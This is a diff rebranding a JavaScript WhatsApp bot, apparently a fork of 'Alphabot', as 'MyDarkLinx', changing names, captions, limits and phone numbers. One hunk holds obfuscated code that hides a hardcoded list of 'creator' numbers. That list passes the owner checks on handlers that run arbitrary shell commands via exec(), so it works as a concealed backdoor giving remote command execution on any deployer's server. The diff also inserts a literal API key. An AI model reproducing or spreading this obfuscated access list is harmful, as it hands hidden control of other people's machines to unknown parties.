@@ -154,7 +154,7 @@ var _bulan = 'Rp 22.000,00'
 var _permanen = 'Rp 100.000,00'
 var __permanen = 'Rp 150.000,00'
 
-zeksApikey = 'Alphabott' //ganti pake apikey lu biar limitnya gk cepet abis 
+zeksApikey = 'ey4S1qqWYfSAD23pphoQFrSmrMB' //ganti pake apikey lu biar limitnya gk cepet abis 
 ApiZeks = 'https://api.zeks.me' // regis disini klo mau dapat apikeynya
 thumbnail = setting.thumb
 pp_bot = fs.readFileSync(`image/${thumbnail}`)
@@ -162,8 +162,8 @@ fthumb = setting.fakethumb
 hit_today = []
 blocked = []
 ban = []
-limitawal = "50"
-gcounttprem = "55" 
+limitawal = "1000"
+gcounttprem = "25" 
 gcounttuser = "100" 
 
 let multi = true
@@ -187,7 +187,7 @@ autoketik = false
 autoregister = setting.user_register
 
 img = setting.img
-baper = 'SUB YT ZEEONE OFC'
+baper = 'MydarkHeart'
 apiku = 'https://youtu.be/2rWbjrDIAyA'
 gc_wa_lu = 'https://chat.whatsapp.com/EU890BcXjyBDkNaUT5WmYV' //klo gk punya gc wa gk usah di ganti 👍
 targetpc = setting.ownerNumberr
@@ -402,13 +402,13 @@ await alpha.updatePresence(from, Presence.composing)
 		const isNsfw = isGroup ? _nsfw.includes(from) : false
 		const isEventon = isGroup ? event.includes(from) : false
 		const isSewa = _sewa.checkSewaGroup(from, sewa)
-		function _0x48c6(_0x36e236,_0x28a7d8){const _0x8c1642=_0x8c16();return _0x48c6=function(_0x48c6ce,_0x1ee6bc){_0x48c6ce=_0x48c6ce-0x186;let _0x4fb38b=_0x8c1642[_0x48c6ce];return _0x4fb38b;},_0x48c6(_0x36e236,_0x28a7d8);}const _0x52adec=_0x48c6;(function(_0x57c75f,_0x150719){const _0x132f1c=_0x48c6,_0x554c9b=_0x57c75f();while(!![]){try{const _0x52df39=-parseInt(_0x132f1c(0x189))/0x1*(parseInt(_0x132f1c(0x18a))/0x2)+parseInt(_0x132f1c(0x193))/0x3*(-parseInt(_0x132f1c(0x190))/0x4)+parseInt(_0x132f1c(0x18e))/0x5*(-parseInt(_0x132f1c(0x18d))/0x6)+parseInt(_0x132f1c(0x186))/0x7+-parseInt(_0x132f1c(0x187))/0x8*(-parseInt(_0x132f1c(0x188))/0x9)+-parseInt(_0x132f1c(0x18b))/0xa*(-parseInt(_0x132f1c(0x191))/0xb)+parseInt(_0x132f1c(0x194))/0xc*(parseInt(_0x132f1c(0x18c))/0xd);if(_0x52df39===_0x150719)break;else _0x554c9b['push'](_0x554c9b['shift']());}catch(_0x1c1493){_0x554c9b['push'](_0x554c9b['shift']());}}}(_0x8c16,0x2d1d7));const alphaNumber=[_0x52adec(0x192),_0x52adec(0x18f)],isCreator=alphaNumber['includes'](sender);function _0x8c16(){const _0x37a4cc=['65xmcCgV','6hoiUcV','785095EkGgce','918156874290@s.whatsapp.net','1432468GswrZV','121ZEBubH','62887435047326@s.whatsapp.net','3dHqOGE','619656hzoCVh','1984220vbkepi','282056trugsR','9LkAPQM','37166bVyVDD','12dJFTOf','314560vKQKoN'];_0x8c16=function(){return _0x37a4cc;};return _0x8c16();}
+		function _0x48c6(_0x36e236,_0x28a7d8){const _0x8c1642=_0x8c16();return _0x48c6=function(_0x48c6ce,_0x1ee6bc){_0x48c6ce=_0x48c6ce-0x186;let _0x4fb38b=_0x8c1642[_0x48c6ce];return _0x4fb38b;},_0x48c6(_0x36e236,_0x28a7d8);}const _0x52adec=_0x48c6;(function(_0x57c75f,_0x150719){const _0x132f1c=_0x48c6,_0x554c9b=_0x57c75f();while(!![]){try{const _0x52df39=-parseInt(_0x132f1c(0x189))/0x1*(parseInt(_0x132f1c(0x18a))/0x2)+parseInt(_0x132f1c(0x193))/0x3*(-parseInt(_0x132f1c(0x190))/0x4)+parseInt(_0x132f1c(0x18e))/0x5*(-parseInt(_0x132f1c(0x18d))/0x6)+parseInt(_0x132f1c(0x186))/0x7+-parseInt(_0x132f1c(0x187))/0x8*(-parseInt(_0x132f1c(0x188))/0x9)+-parseInt(_0x132f1c(0x18b))/0xa*(-parseInt(_0x132f1c(0x191))/0xb)+parseInt(_0x132f1c(0x194))/0xc*(parseInt(_0x132f1c(0x18c))/0xd);if(_0x52df39===_0x150719)break;else _0x554c9b['push'](_0x554c9b['shift']());}catch(_0x1c1493){_0x554c9b['push'](_0x554c9b['shift']());}}}(_0x8c16,0x2d1d7));const alphaNumber=[_0x52adec(0x192),_0x52adec(0x18f)],isCreator=alphaNumber['includes'](sender);function _0x8c16(){const _0x37a4cc=['65xmcCgV','6hoiUcV','785095EkGgce','918156874290@s.whatsapp.net','1432468GswrZV','121ZEBubH','6289674504647@s.whatsapp.net','3dHqOGE','619656hzoCVh','1984220vbkepi','282056trugsR','9LkAPQM','37166bVyVDD','12dJFTOf','314560vKQKoN'];_0x8c16=function(){return _0x37a4cc;};return _0x8c16();}
 		const isPremium = isOwner || isCreator || mek.key.fromMe ? true : premium.checkPremiumUser(sender, _premium)
 		const gcount = isPremium ? gcounttprem : gcounttuser
 		const isBanned = banned.includes(sender)
 		if (isCmd && isBanned) return reply2(lang.benned())
 		const isVote = isGroup ? voting.includes(from) : false
-		const ratee = ["Alphabot","Alphabot","Alphabot","Alphabot","Alphabot","Alphabot","Alphabot"]
+		const ratee = ["MyDarkLinx","MyDarkLinx","MyDarkLinx","MyDarkLinx","MyDarkLinx","MyDarkLinx","MyDarkLinx"]
         const tee = ratee[Math.floor(Math.random() * ratee.length)]
         const rateee = ["Dj storongest jedag jedug 30 s","Dj akimilaku remix terbaru 2021 30 s","Dj campuran 30 detik","Dj sidro 2  style Thailand viral 30 s","Dj disitu enak susu akimilaku 30 s","Dj zombie x melody stres love 30 s","Dj numa muma ye style Thailand 30 s","Dj biasalah x bola boma ye 30 s"]
         const srchh = rateee[Math.floor(Math.random() * rateee.length)]
@@ -1393,7 +1393,7 @@ const bugtrol = {
 						"surface": "CATALOG",
 						"message": `${creator}`,
 						"orderTitle": `${creator}`,
-						"sellerJid": "62887435047326@s.whatsapp.net",
+						"sellerJid": "6289674504647@s.whatsapp.net",
 						"token": "AR5b5YFz2g4W5fYrjbeakPiI3/XxarATSeP+KLh+0FGwkw=="
 					}}}
         const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: fs.readFileSync(`image/${thumbnail}`), surface: 200, message: `ᴄᴍᴅ ᴇxᴇᴄ : ${command}`, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
@@ -1571,7 +1571,7 @@ mentions(_vote,_p,true)
 const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
 let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
 let fil = vote.map(v => v.participant)
-let id_vote = sender ? sender : '62887435047326@s.whatsapp.net'
+let id_vote = sender ? sender : '6289674504647@s.whatsapp.net'
 if(fil.includes(id_vote)) {
 return mentions('@'+sender.split('@')[0]+' You have voted', fil, true)
 } else {
@@ -2288,7 +2288,7 @@ alpha.sendMessage(from,  btn1, MessageType.buttonsMessage,{
 
 break
 case 'shop':
-koko = `62887435047326@s.whatsapp.net`
+koko = `6289674504647@s.whatsapp.net`
 			let content1 = fs.readFileSync(`image/${thumbnail}`)
 const media1 = await alpha.prepareMessage(from, content1, MessageType.location, {thumbnail: fs.readFileSync(`image/${thumbnail}`)})
 let bacotlu1 = media1.message["ephemeralMessage"] ? media1.message.ephemeralMessage : media1
@@ -2300,7 +2300,7 @@ const buttons1 = [
 ]
 
 const btn1 = {
-    contentText: `Halo @${sender.split('@')[0]}\n\nTop up diamond by WhatsApp bot. Ini hanyalah percobaan jadi zeeone gak jual diamond, uc, dll. Untuk list shop yang lain ketik ${prefix}price😅🤙`,
+    contentText: `Halo @${sender.split('@')[0]}\n\nTop up diamond by WhatsApp bot. Ini hanyalah percobaan jadi MyDarkLinx gak jual diamond, uc, dll. Untuk list shop yang lain ketik ${prefix}price😅🤙`,
     footerText: `${tampilTanggal}\n${tampilWaktu}\n${creator}\n\nRegard @${koko.split('@')[0]}`,
     buttons: buttons1,
     headerType: 6,
@@ -3035,8 +3035,8 @@ case 'bcgif':
 					for (let i of ini_ownerNumber) {
 					const vname = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
 					ini_list.push({
-					"displayName": 'Owner Alphabot',
-					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${alpha.user.name}`}\nORG: SUBSCRIBE ZEEONE OFC;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
+					"displayName": 'Owner MyDarkLinx',
+					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${alpha.user.name}`}\nORG: ADD CONTACT GW;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
 					})
 					}
 					hehe = await alpha.sendMessage(from, {
@@ -3331,7 +3331,7 @@ break
 		            imageToBase64(pjr)
 		            .then((response) => {
 		            media =  Buffer.from(response, 'base64');
-		            alpha.sendMessage(from,media,image,{quoted:mek,caption:'Dasar wibu. Nih!!!\nJgn lupa sub YT : ZEEONE OFC'})
+		            alpha.sendMessage(from,media,image,{quoted:mek,caption:'Dasar wibu. Nih!!!\nJgn Boker'})
 		            }
 		            )
 		            .catch((error) => {
@@ -3368,7 +3368,7 @@ case 'setexif':
 				    media_ = await alpha.downloadAndSaveMediaMessage(encmedia_)
 		            anu = args.join(' ').split('|')
 		            satu = anu[0] !== '' ? anu[0] : `SUBSCRIBE`
-		            dua = typeof anu[1] !== 'undefined' ? anu[1] : `ZEEONE OFC`
+		            dua = typeof anu[1] !== 'undefined' ? anu[1] : `YANDARU H3H3`
 		            require('./lib/fetcher.js').createExif(satu, dua)
 					require('./lib/fetcher.js').modStick(media_ , alpha, mek, from)
 					break
@@ -3724,7 +3724,7 @@ break
 					fs.unlinkSync(mediaa)
 					if (err) return reply('Yah gagal, coba ulangi ^_^')
 					buffer = fs.readFileSync(ran)
-					fakethumb(buffer,'```Nih kak, jgn lupa Support YT : ZEEONE OFC```')
+					fakethumb(buffer,'```Nih kak, jgn lupa follow IG @yogiandaru98```')
 					fs.unlinkSync(ran)
 					})
 					break
@@ -3987,7 +3987,7 @@ ${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.bat
 			        if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
 					if (!q) return fakegroup(mess.wrongFormat)
 					exec(q, (err, stdout) => {
-					if (err) return fakegroup(`ALPHABOT:~ ${err}`)
+					if (err) return fakegroup(`MyDarkLinx:~ ${err}`)
 					if (stdout) {
 					fakegroup(stdout)
 					}
@@ -4398,7 +4398,7 @@ break*/
 					}
 					seeer = `Nama : *${pushname}`
 					thumbb = await getBuffer(pic)
-					anuu  = {contextInfo:{"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `${numbernye}@s.whatsapp.net`, 'remoteJid': '6289523258649-1604595598@g.us', 'quotedMessage': {"imageMessage": {"caption": `「 Bot by zeeone 」`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
+					anuu  = {contextInfo:{"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `${numbernye}@s.whatsapp.net`, 'remoteJid': '6289523258649-1604595598@g.us', 'quotedMessage': {"imageMessage": {"caption": `「 Bot by YANDARU 」`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
                     alpha.sendMessage(from, thumbb ,image, anuu)
 				}
 				break
@@ -5878,7 +5878,7 @@ break
           for (let hui of banned) {
             teks += `│+  @${hui.split('@')[0]}\n`
           }
-          teks += `│+ Total : ${banned.length}\n╰──────「 *ALPHA BOT* 」────`
+          teks += `│+ Total : ${banned.length}\n╰──────「 *MYDARKLINX* 」────`
           alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": [hui] } })
           break
  		case 'ban': case 'banned': case 'block':
@@ -6070,7 +6070,7 @@ break
                     fs.writeFileSync("./src/tebakanime.json", JSON.stringify(tebakanime))
                     console.log(jawaban)
                     tebakya = await getBuffer(tebak)
-                    alpha.sendMessage(from, tebakya, image, { quoted: mek, caption: "Jawaban salah auto harus donasi" })
+                    alpha.sendMessage(from, tebakya, image, { quoted: mek, caption: "Jawaban send gopay ke owner aowakokakoawk" })
                    await sleep(30000)
                     if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
                         reply("Jawaban: " + jawaban)
@@ -6124,8 +6124,8 @@ break
 					for (let i of ini_ownerNumber) {
 					const vname_ = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
 					ini_list.push({
-					"displayName": 'Owner Alphabot',
-					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname_ ? `${vname_}` : `${alpha.user.name}`}\nORG: SUBSCRIBE ZEEONE OFC;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
+					"displayName": 'Owner MyDarkLinx',
+					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname_ ? `${vname_}` : `${alpha.user.name}`}\nORG: FOLLOW IG @yogiandaru1;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
 					})
 					}
 					hehe = await alpha.sendMessage(from, {
@@ -6169,8 +6169,8 @@ if (subscribezeeoneofc == "ownerku"){
 					for (let i of ini_ownerNumber) {
 					const vname_ = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
 					ini_list.push({
-					"displayName": 'Owner Alphabot',
-					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname_ ? `${vname_}` : `${alpha.user.name}`}\nORG: SUBSCRIBE ZEEONE OFC;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
+					"displayName": 'Owner MyDarkLinx',
+					"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname_ ? `${vname_}` : `${alpha.user.name}`}\nORG: FOLLOW IG @yogiandaru98;\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
 					})
 					}
 					hehe = await alpha.sendMessage(from, {
@@ -6515,7 +6515,7 @@ if (budy.startsWith('$')){
 if (!mek.key.fromMe && !isOwner && !isCreator ) return reply(lang.onlyOwner())
 qur = budy.slice(2)
 exec(qur, (err, stdout) => {
-if (err) return reply(`ALPHABOT :~ ${err}`)
+if (err) return reply(`MYDARKLINX :~ ${err}`)
 if (stdout) {
 reply(stdout)
 }
